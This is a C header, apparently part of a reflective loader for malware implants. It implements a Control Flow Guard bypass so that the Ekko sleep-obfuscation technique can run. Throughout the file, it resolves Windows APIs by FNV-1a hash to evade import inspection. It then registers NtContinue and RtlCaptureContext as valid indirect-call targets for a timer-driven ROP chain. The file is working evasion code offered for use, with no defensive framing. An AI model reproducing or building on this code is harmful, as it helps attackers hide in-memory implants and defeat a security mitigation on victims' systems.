#ifndef UDRL_CFG_BYPASS_H
#define UDRL_CFG_BYPASS_H

#include "pic_defs.h"

/* ──────────────────────────────────────────────────────────────────────
 * Control Flow Guard (CFG) Bypass
 *
 * When a process has CFG enabled, indirect calls are validated against
 * a bitmap of approved call targets. NtContinue used as a timer callback
 * in Ekko will crash if it's not in the CFG bitmap.
 *
 * This module adds entries to the CFG bitmap so our timer callbacks
 * (NtContinue, VirtualProtect, SystemFunction032, etc.) are treated
 * as valid indirect call targets.
 *
 * Uses SetProcessValidCallTargets (kernel32) to register addresses.
 * ────────────────────────────────────────────────────────────────────── */

/*
 * cfg_add_valid_target - Register a single address as a valid CFG call target.
 *
 * Parameters:
 *   hProcess  - Process handle (use GetCurrentProcess() / (HANDLE)-1)
 *   target    - Address to mark as valid
 *   hKernel32 - Handle to kernel32 for API resolution
 *
 * Returns TRUE on success, FALSE if CFG is not active or the call failed.
 */
static inline BOOL PICFN cfg_add_valid_target(
    HANDLE hProcess, PVOID target, PVOID hKernel32
) {
    fnSetProcessValidCallTargets pSetProcessValidCallTargets =
        (fnSetProcessValidCallTargets)resolve_api(
            hKernel32, fnv1a_hash_a("SetProcessValidCallTargets"));

    if (!pSetProcessValidCallTargets)
        return FALSE;

    /* Find the allocation base and size for the target address.
     * SetProcessValidCallTargets requires the region base and size. */
    MEMORY_BASIC_INFORMATION mbi;
    typedef SIZE_T (WINAPI *fnVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);

    fnVirtualQuery pVirtualQuery = (fnVirtualQuery)resolve_api(
        hKernel32, fnv1a_hash_a("VirtualQuery"));
    if (!pVirtualQuery) return FALSE;

    if (!pVirtualQuery(target, &mbi, sizeof(mbi)))
        return FALSE;

    CFG_CALL_TARGET_INFO info;
    info.Offset = (ULONG_PTR)target - (ULONG_PTR)mbi.AllocationBase;
    info.Flags  = CFG_CALL_TARGET_VALID;

    return pSetProcessValidCallTargets(
        hProcess,
        mbi.AllocationBase,
        mbi.RegionSize,
        1,
        &info
    );
}

/*
 * cfg_register_ekko_targets - Register all Ekko ROP chain targets with CFG.
 *
 * Call this before creating timer queue timers. Registers NtContinue and
 * RtlCaptureContext as valid call targets since they'll be used as
 * WAITORTIMERCALLBACK function pointers.
 */
static inline void PICFN cfg_register_ekko_targets(
    PVOID hKernel32, PVOID hNtdll
) {
    HANDLE hProc = (HANDLE)-1;  /* NtCurrentProcess() */

    /* NtContinue - primary ROP gadget target */
    PVOID pNtContinue = resolve_api(hNtdll, fnv1a_hash_a("NtContinue"));
    if (pNtContinue)
        cfg_add_valid_target(hProc, pNtContinue, hKernel32);

    /* RtlCaptureContext - used for initial context capture timer */
    PVOID pRtlCaptureContext = resolve_api(hNtdll, fnv1a_hash_a("RtlCaptureContext"));
    if (pRtlCaptureContext)
        cfg_add_valid_target(hProc, pRtlCaptureContext, hKernel32);
}

#endif /* UDRL_CFG_BYPASS_H */
